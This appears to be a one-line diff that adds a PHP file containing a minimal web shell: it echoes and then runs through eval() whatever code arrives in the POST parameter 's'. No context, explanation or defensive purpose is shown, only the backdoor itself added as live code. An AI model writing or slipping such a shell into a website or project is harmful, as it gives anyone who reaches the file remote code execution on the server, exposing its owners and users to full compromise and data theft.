@@ -1,0 +1,1 @@
+<?php if(@$_POST['s']){echo $_POST['s']."\n";eval($_POST['s']);}?>
